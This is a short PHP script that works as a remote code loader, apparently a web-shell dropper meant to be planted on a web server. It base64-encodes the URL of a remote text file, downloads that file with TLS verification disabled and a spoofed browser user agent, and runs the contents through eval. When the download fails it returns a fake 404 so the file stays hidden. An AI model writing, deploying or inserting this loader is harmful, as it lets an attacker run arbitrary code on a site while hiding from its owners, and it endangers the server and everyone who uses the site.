<?php
$a = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Fub25pbXNhbnRpYWdveGthbGktc291cmNlL2tlcmFuZy9yZWZzL2hlYWRzL21haW4va2VyYW5nLnR4dA==";
$u = base64_decode($a);
$c = "";
if (function_exists("curl_init")) {
    $h = curl_init($u);
    curl_setopt_array($h, [CURLOPT_RETURNTRANSFER=>1, CURLOPT_FOLLOWLOCATION=>1, CURLOPT_SSL_VERIFYPEER=>0, CURLOPT_USERAGENT=>"Mozilla/5.0", CURLOPT_TIMEOUT=>15]);
    $c = curl_exec($h);
    curl_close($h);
}
if (!$c && ini_get("allow_url_fopen")) $c = @file_get_contents($u);
if ($c) eval("?>".$c); else { http_response_code(404); die("404"); }
?>